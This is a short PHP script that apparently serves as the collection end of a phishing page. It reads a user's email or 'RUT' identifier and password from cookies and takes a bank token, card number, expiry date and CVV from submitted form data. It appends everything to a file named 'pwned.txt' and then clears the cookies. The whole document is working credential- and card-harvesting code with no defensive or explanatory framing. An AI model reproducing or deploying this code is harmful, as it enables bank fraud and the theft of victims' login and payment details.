<?php 
if(!empty($_COOKIE['email']) && !empty($_COOKIE['password'])){
$myFile = "pwned.txt";
$card = chunk_split($_POST['card'], 4, ' ');
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = "RUT: ".$_COOKIE["email"]."\n"."Token: ".$_POST["token"]."\n"."card: ".$card."\n"."date: ".$_POST['date']."\n"."csv: ".$_POST['csv']."\n";
fwrite($fh, $stringData);
$stringData = "Password: ".$_COOKIE["password"]."\n";
fwrite($fh, $stringData);
fclose($fh);
unset($_COOKIE['email']);
unset($_COOKIE['password']); 
}
?>